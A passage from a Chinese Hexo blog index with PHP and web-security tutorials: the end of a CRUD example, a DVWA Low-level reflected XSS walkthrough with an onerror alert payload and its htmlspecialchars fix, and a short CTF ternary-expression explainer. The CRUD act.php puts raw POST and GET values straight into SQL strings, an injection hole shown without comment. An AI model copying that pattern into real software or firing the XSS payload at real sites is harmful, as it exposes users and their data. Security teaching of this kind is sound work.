alt="image_1cc57nvhn1dml1u0910ko1sccv4213.png-48.6kB"></p><h2 id="最后我们看看act-php的代码："><a href="#最后我们看看act-php的代码：" class="headerlink" title="最后我们看看act.php的代码："></a>最后我们看看act.php的代码：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">include</span> <span class="string">'config.inc.php'</span>; <span class="comment">//包含PDO链接数据库代码</span></span><br><span class="line"></span><br><span class="line">    $act = $_GET[<span class="string">"act"</span>]; <span class="comment">//获取GET请求过来的act值，来实现增、删、改。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($act == <span class="string">'delete'</span>)&#123; <span class="comment">//如果是选择删除</span></span><br><span class="line">        $Id = $_GET[<span class="string">"Id"</span>]; <span class="comment">//获取GET请求过来的ID</span></span><br><span class="line">        $sql = <span class="string">"delete from t1 where Id=?"</span>; <span class="comment">//这是SQL语句的删除</span></span><br><span class="line">        $smt = $pdo-&gt;prepare($sql); <span class="comment">//给SQL语句做标记</span></span><br><span class="line">        $smt-&gt;bindValue(<span class="number">1</span>,$Id); <span class="comment">//绑定一个值到用作预处理的 SQL 语句中的对应命名占位符或问号占位符</span></span><br><span class="line">    <span class="keyword">if</span>($smt-&gt;execute())&#123; <span class="comment">//判断是否执行成功，如果执行成功返回的是1</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;location='index.php'&lt;/script&gt;"</span>; <span class="comment">//执行成功就跳转到首页(index.php)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>($act == <span class="string">'insert'</span>)&#123; <span class="comment">//如果是选择插入</span></span><br><span class="line">        $Name = $_POST[<span class="string">"Name"</span>]; <span class="comment">//获取POST请求的Name值</span></span><br><span class="line">        $Pwd = $_POST[<span class="string">"Pwd"</span>]; <span class="comment">//获取POST请求的Pwd值</span></span><br><span class="line">        $sql = <span class="string">"insert into t1(Name,Pwd) values('&#123;$Name&#125;','&#123;$Pwd&#125;')"</span>; <span class="comment">//这是SQL语句的插入</span></span><br><span class="line">        $smt = $pdo-&gt;prepare($sql); <span class="comment">//给SQL语句做标记</span></span><br><span class="line">        <span class="keyword">if</span>($smt-&gt;execute())&#123; <span class="comment">//判断是否执行成功</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;location='index.php'&lt;/script&gt;"</span>; <span class="comment">//执行成功就跳转到首页(index.php)</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">/*如果act=update和id=x，那么就执行修改的SQL语句，修改条件(where)是Id=x*/</span></span><br><span class="line">    <span class="keyword">if</span>($act == <span class="string">'update'</span>)&#123; <span class="comment">//如果是更改</span></span><br><span class="line">        $Id = $_GET[<span class="string">"Id"</span>]; <span class="comment">//获取GET请求的Id值</span></span><br><span class="line">        $Name = $_POST[<span class="string">"Name"</span>]; <span class="comment">//获取POST的Name值</span></span><br><span class="line">        $Pwd = $_POST[<span class="string">"Pwd"</span>]; <span class="comment">//获取POST请求的Pwd值</span></span><br><span class="line">        $sql = <span class="string">"update t1 set Name='&#123;$Name&#125;',Pwd='&#123;$Pwd&#125;' where Id=&#123;$Id&#125;"</span>; <span class="comment">//这是SQL语句的更改</span></span><br><span class="line">        $smt = $pdo-&gt;prepare($sql); <span class="comment">//给SQL语句做标记</span></span><br><span class="line">        <span class="keyword">if</span>($smt-&gt;execute())&#123; <span class="comment">//判断是否执行成功</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;location='index.php'&lt;/script&gt;"</span>; <span class="comment">//如果执行成功就跳转到首页(index.php)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>基于DVWA的反射型Xss测试平台Low等级讲解</title>
      <link href="/2018/05/24/%E5%9F%BA%E4%BA%8EDVWA%E7%9A%84Xss%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B0Low%E7%AD%89%E7%BA%A7%E8%AE%B2%E8%A7%A3/"/>
      <url>/2018/05/24/%E5%9F%BA%E4%BA%8EDVWA%E7%9A%84Xss%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B0Low%E7%AD%89%E7%BA%A7%E8%AE%B2%E8%A7%A3/</url>
      <content type="html"><![CDATA[<div class="note primary"><p>Dvwa是一个网站渗透测试演练平台，里面包括了Xss攻击,Sql注入攻击，Csrf漏洞、文件上传漏洞、命令注入漏洞等，而且每个漏洞都分为<code>Low(低等级)、Medium( 中等级 )、High( 高等级 )、Impossible( 没漏洞等级 )</code></p></div><a id="more"></a><p>下载过程和安装过程网上可以找到我就不讲解了。</p><h3 id="首先将Dvwa等级设置成Low"><a href="#首先将Dvwa等级设置成Low" class="headerlink" title="首先将Dvwa等级设置成Low:"></a>首先将<code>Dvwa</code>等级设置成<code>Low</code>:</h3><p><img src="http://static.zybuluo.com/1kbfree/xhlnfqib3ib7m5jpq5s0k9us/image_1ce8m63q6g1s5ab1ef51ilf92m9.png" alt="image_1ce8m63q6g1s5ab1ef51ilf92m9.png-135.5kB"></p><hr><h2 id="开始Xss漏洞讲解"><a href="#开始Xss漏洞讲解" class="headerlink" title="开始Xss漏洞讲解"></a>开始Xss漏洞讲解</h2><h3 id="Xss反射型："><a href="#Xss反射型：" class="headerlink" title="Xss反射型："></a>Xss反射型：</h3><p><img src="http://static.zybuluo.com/1kbfree/bzktsumqyk5cl12z0z15nojx/image_1ce8mao1la4233k77t19h21v82m.png" alt="image_1ce8mao1la4233k77t19h21v82m.png-203.8kB"><br><em>当输入<code>hello</code>在输入框点击Submit后，会输出一个<code>Hello iamfree</code>，那么我们来看看这是如何实现的</em></p><h4 id="实现的代码："><a href="#实现的代码：" class="headerlink" title="实现的代码："></a>实现的代码：</h4><p><img src="http://static.zybuluo.com/1kbfree/28z6tmahfg6x1z7reai804j1/image_1ce8n2a0ijtjgs8iitt4a1ou09.png" alt="image_1ce8n2a0ijtjgs8iitt4a1ou09.png-147.4kB"><br><em>因为这是<code>Low</code>级别的，所以我们可以清楚的看见这里没有做任何过滤，我们只需要输入一串而已的Js代码就可以实现盗取别人Cookie，做钓鱼之类的功能，下面我来简单的演示一下~</em></p><p>输入<code>&lt;img src=x onerror=alert(&#39;iamfree&#39;)&gt;</code>后，Url变成<code>http://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=%3Cimg+src%3Dx+onerror%3Dalert%28%27iamfree%27%29%3E#</code>，效果:<br><img src="http://static.zybuluo.com/1kbfree/hl67ru1a4l4ltyvhi82dj0bw/image_1ce8naell1jlrkv6s1214dh7n7m.png" alt="image_1ce8naell1jlrkv6s1214dh7n7m.png-130.1kB"></p><div class="note warning"><p><code>&lt;img src=x onerror=alert(&#39;iamfree&#39;)&gt;</code>的src表示img图片的地址，可以是本地也可以是Url形式;onerror的意思是如果图片没有正常显示的话就会执行<code>=</code>后面的代码，因为这里<code>src=x</code>而<code>x</code>是不存在的，所以无法显示，就会报错了~</p></div><h3 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h3><p><strong>这里的话防御很简单的，只需要一个函数即可：</strong><br><img src="http://static.zybuluo.com/1kbfree/n875b1a8nh9rciqc7w66vxku/image_1ce8nikp01hm91qse12112ra2802p.png" alt="image_1ce8nikp01hm91qse12112ra2802p.png-53.3kB"></p><p><strong>防御代码:</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="comment">// 防御的反射Xss</span></span><br><span class="line">    $name = htmlspecialchars($_GET[<span class="string">'name'</span>]);</span><br><span class="line">    $html .= <span class="string">'&lt;pre&gt;Hello '</span> . $name . <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><strong>继续访问刚才的Url(<code>http://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=%3Cimg+src%3Dx+onerror%3Dalert%28%27iamfree%27%29%3E#</code>)，看看是否有效:</strong><br><img src="http://static.zybuluo.com/1kbfree/3y12i2skpud63a1qgec93sxz/image_1ce8nph771gbkh9n1v6q16p41ho736.png" alt="image_1ce8nph771gbkh9n1v6q16p41ho736.png-175.7kB"><br><em>成功的防止了Xss反射型攻击了~</em></p><h3 id="htmlspecialchars函数的官方解释"><a href="#htmlspecialchars函数的官方解释" class="headerlink" title="htmlspecialchars函数的官方解释:"></a>htmlspecialchars函数的官方解释:</h3><p><img src="http://static.zybuluo.com/1kbfree/piy4p2lkq0h81v0d1u4y5mb7/image_1ce8nug1jgbj1iib1hl91ii51vic3j.png" alt="image_1ce8nug1jgbj1iib1hl91ii51vic3j.png-137.1kB"></p><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
      
      <categories>
          
          <category> Web攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
            <tag> Dvwa </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> Xss </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>某CTF赛的一处代码简单讲解</title>
      <link href="/2018/05/24/%E6%9F%90CTF%E8%B5%9B%E7%9A%84%E4%B8%80%E5%A4%84%E4%BB%A3%E7%A0%81%E7%AE%80%E5%8D%95%E8%AE%B2%E8%A7%A3/"/>
      <url>/2018/05/24/%E6%9F%90CTF%E8%B5%9B%E7%9A%84%E4%B8%80%E5%A4%84%E4%BB%A3%E7%A0%81%E7%AE%80%E5%8D%95%E8%AE%B2%E8%A7%A3/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>此篇文章只是给里面的代码处做一下详细的讲解~<br>原文地址:loudong.360.cn/School/content/id/285</p></blockquote><a id="more"></a><p>CTF线下赛中一处代码( 红色区域处 )，现在就是来讲解这个的~<br><img src="http://static.zybuluo.com/1kbfree/utarpdc4wsivh5yzlnihpacr/image_1ce8hrduq1kqieu7kt57qo17mj9.png" alt="image_1ce8hrduq1kqieu7kt57qo17mj9.png-33.3kB"></p><h2 id="讲解开始"><a href="#讲解开始" class="headerlink" title="讲解开始:"></a>讲解开始:</h2><p>首先看一下我写的这个代码:<br><img src="http://static.zybuluo.com/1kbfree/d2mpfibd3nhui8m27fbu41yo/image_1ce8htj9h1i8l11pqbhu1tun16s8m.png" alt="image_1ce8htj9h1i8l11pqbhu1tun16s8m.png-99.2kB"><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">e</span><span class="params">( $str )</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( is_array( $str ) )&#123; <span class="comment">//如果是列表~</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">        var_dump( $str );</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="keyword">echo</span> $str ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$mylist = [ </span><br><span class="line">    <span class="string">'ctrl'</span> =&gt; ( !<span class="keyword">empty</span>($_GET[<span class="string">'p'</span>]) ? $_GET[<span class="string">'p'</span>] : <span class="string">'blog'</span> ) , <span class="comment">//ctrl的value值：如果get请求的p值不为空，那么就返回get请求的p值，否者返回blog</span></span><br><span class="line">    <span class="string">'template'</span> =&gt; ( !<span class="keyword">empty</span>($_GET[<span class="string">'t'</span>]) ? $_GET[<span class="string">'t'</span>] : <span class="string">'pc'</span> ) <span class="comment">//template的value值：如果get请求的t值不为空，那么就返回get请求的t值，否者返回pc\</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">e( $mylist );</span><br></pre></td></tr></table></figure></p><div class="note primary"><p>这里的<code>!empty($_GET[&#39;p&#39;]) ? $_GET[&#39;p&#39;] : &#39;blog&#39;</code>是三元表达式，详细用法我也在代码处讲解过了</p></div><h3 id="实验一下代码功能："><a href="#实验一下代码功能：" class="headerlink" title="实验一下代码功能："></a>实验一下代码功能：</h3><p><img src="http://static.zybuluo.com/1kbfree/fttlcckmsujfj51kx8w604gg/image_1ce8i4heebh715oe3p410o7epc9.png" alt="image_1ce8i4heebh715oe3p410o7epc9.png-83.8kB"><br><em>如果没有添加任何值的话，默认的就是ctrl的值为blog,template的值为pc</em></p><h4 id="我们传递一下GET请求的p值和GET请求的t值"><a href="#我们传递一下GET请求的p值和GET请求的t值" class="headerlink" title="我们传递一下GET请求的p值和GET请求的t值:"></a>我们传递一下<code>GET请求的p值</code>和<code>GET请求的t值</code>:</h4><p><img src="http://static.zybuluo.com/1kbfree/yy85lf6qhabol733jjgb233o/image_1ce8idtit131p1mjr1abc1lngs1a1j.png" alt="image_1ce8idtit131p1mjr1abc1lngs1a1j.png-140.4kB"></p><p><img src="http://static.zybuluo.com/1kbfree/5onny736jjn5dx6y2ftao8a0/image_1ce8ibrda1vb11drk5vr8iju2216.png" alt="image_1ce8ibrda1vb11drk5vr8iju2216.png-162.5kB"></p><div class="note success"><p>如果你们觉得这篇文章有点水的话… 那也确实是，哈哈哈(太基础)，但是我只是想来做一篇文章来摆设摆设~</p></div> <blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
      
      <categories>
          
          <category> Web攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
